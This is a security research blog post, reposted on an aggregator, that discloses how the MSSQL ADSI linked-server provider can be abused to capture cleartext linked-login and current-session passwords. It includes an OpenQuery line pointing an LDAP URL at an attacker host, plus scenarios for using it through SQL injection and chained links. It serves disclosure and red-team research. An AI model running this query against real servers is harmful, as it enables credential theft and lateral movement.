---
title: MSSQL linked servers: abusing ADSI for password retrieval
url: https://buaq.net/go-167748.html
source: unSafe.sh - 不安全
date: 2023-06-08
fetch_date: 2025-10-04T11:46:18.211327
---

# MSSQL linked servers: abusing ADSI for password retrieval

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/084a1acf0d2f24da73fcd8f7089e7a0c.jpg)

MSSQL linked servers: abusing ADSI for password retrieval

IntroductionADSII saw your credentials!Scenario 1: Obtain the cleartext password of an ADSI li
*2023-6-7 23:15:7
Author: [www.tarlogic.com(查看原文)](/jump-167748.htm)
阅读量:31
收藏*

---

* [Introduction](#Introduction "Introduction")
* [ADSI](#ADSI "ADSI")
* [I saw your credentials!](#I_saw_your_credentials "I saw your credentials!")
  + [Scenario 1: Obtain the cleartext password of an ADSI linked login](#Scenario_1_Obtain_the_cleartext_password_of_an_ADSI_linked_login "Scenario 1: Obtain the cleartext password of an ADSI linked login")
  + [Scenario 2: Retrieve the current security context password](#Scenario_2_Retrieve_the_current_security_context_password "Scenario 2: Retrieve the current security context password")
* [NTLM Relay?](#NTLM_Relay "NTLM Relay?")
* [PoC or GTFO](#PoC_or_GTFO "PoC or GTFO")

## Introduction

When we talk about Microsoft SQL Server **linked servers**, we usually think of links to another SQL Server instances. However, this is only one of the multiple available options, so today we are going to delve into the [Active Directory Service Interfaces](https://learn.microsoft.com/en-us/windows/win32/adsi/distributed-query) (**ADSI**) provider, which allows querying the AD using the LDAP protocol.

After discussing its inner workings, we are presenting a new technique to retrieve cleartext linked login passwords and, in some cases, the password of the current security context. This has proven useful in several of our [Red Team](https://www.tarlogic.com/red-team-services/) engagements.

## ADSI

Through the ADSI provider we can create a link to a domain controller (`sp_addlinkedserver`) and then perform queries using the `SELECT` statement and the `OPENQUERY` function:

[![Typical ADSI link usage](https://www.tarlogic.com/wp-content/uploads/2023/06/adsi_creation.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/adsi_creation.png)

Typical ADSI link usage

As with other link types, we can additionally configure a linked login to be used when connecting to the remote data source (`sp_addlinkedsrvlogin`). In this case, since we are dealing with Active Directory, it needs to be a domain account.

Likewise, if we don’t configure an account, we’ll only be able to use the link if the current context client user is a domain user (which implies Windows authentication was used to log into the SQL server). With this in mind, we performed an analysis at protocol level to see what was happening under the hood and got some interesting results.

If we fire the query using a configured linked login, SQL Server authenticates against the domain controller using **LDAP simple authentication**, which means that the password is transmitted in cleartext:

[![Linked login password (simple bind)](https://www.tarlogic.com/wp-content/uploads/2023/06/login_link_user.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/login_link_user.png)

Linked login password (simple bind)

On the contrary, if we connect to the SQL Server with a domain user and the link has no linked logins, it will use **Windows Authentication** (GSSAPI).

[![Windows Authentication (GSSAPI)](https://www.tarlogic.com/wp-content/uploads/2023/06/login_noUser_NTLM.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/login_noUser_NTLM.png)

Windows Authentication (GSSAPI)

These are the only two valid options for ADSI to work, but… what happens when we try to use a link without linked logins, having authenticated with a SQL user instead of a domain user?

[![Current SQL login cleartext password (simple bind)](https://www.tarlogic.com/wp-content/uploads/2023/06/login_noUser_SQL.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/login_noUser_SQL.png)

Current SQL login cleartext password (simple bind)

As you can see in the picture above, SQL Server will try to perform a simple bind using the current SQL login cleartext password, which must have been **somehow stored in memory**.

[![Login types and associated LDAP authentication](https://www.tarlogic.com/wp-content/uploads/2023/06/table-1.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/table-1.png)

Login types and associated LDAP authentication

## I saw your credentials!

Knowing this, you probably thought of capturing network traffic (in the case of having enough privileges and access to the machine). But what if I tell you that you can retrieve the passwords from SQL code and even with an unprivileged user?

Just as you do when configuring any linked server, the ADSI provider needs you to specify a remote data source, in this case a domain controller. However, we noticed that since it is allowed by the syntax to indicate an arbitrary LDAP URL in the `FROM` clause (probably designed to provide a specific base DN), you can **point to an attacker-controlled machine** and receive the connections, ignoring the configured data source.

```
SELECT * FROM OpenQuery (ADSI, 'SELECT * FROM ''LDAP://attacker''')
```

It’s worth noting that if the ADSI linked server already exists, even an unprivileged user can perform the attack. Else, a user with at least `ALTER ANY LINKED SERVER` privilege can temporarily configure a new link and carry on.

We’ve come up with some scenarios where this technique could be useful, which are detailed below.

### Scenario 1: Obtain the cleartext password of an ADSI linked login

[![Scenario 1 schema](https://www.tarlogic.com/wp-content/uploads/2023/06/adsi_schema1.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/adsi_schema1.png)

Scenario 1 schema

In 2014, NetSPI published a [research](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/)about decrypting linked logins passwords, but assuming some annoying requirements: being sysadmin and local admin of the machine, as well as having the possibility of using a DAC connection (by default only available on localhost). Our technique doesn’t need these privileges nor network access, so for example it can be exploited directly from a SQL injection or through another SQL Server link.

### Scenario 2: Retrieve the current security context password

As we saw in the previous section, the current password must be cached in memory. Again, this can be useful when you are executing SQL without knowing the current user password, for example, in the case of a SQL injection.

Another scenario we usually encounter is to have unprivileged access to a SQL server (let’s say **WINSQL01**), which has a linked SQL server (**WINSQL02**) using a sysadmin linked account (**sa**). In this case, we could perform the attack through the SQL link and retrieve the “sa” password, which might be reused in other servers.

[![Scenario 2 schema](https://www.tarlogic.com/wp-content/uploads/2023/06/adsi_schema2.png)](https://www.tarlogic.com/wp-content/uploads/2023/06/adsi_schema2.png)

Scenario 2 schema

## NTLM Relay?

When we first saw GSSAPI authentication, some NTLM relay scenarios came to our minds. Nevertheless, the LDAP client negotiates signing by default, so we don’t see how this could be useful in any way.

## PoC or GTFO

In one of our [Red Team](https://www.tarlogic.com/red-team-services/) engagements, we wanted to perform this attack in a restricted environment where we couldn’t establish outbound connections. Since in this case we had sysadmin privileges, we decided to develop a CLR assembly which listens on a localhost port and parses an incoming LDAP bind request to finally return the cleartext password.

In the following...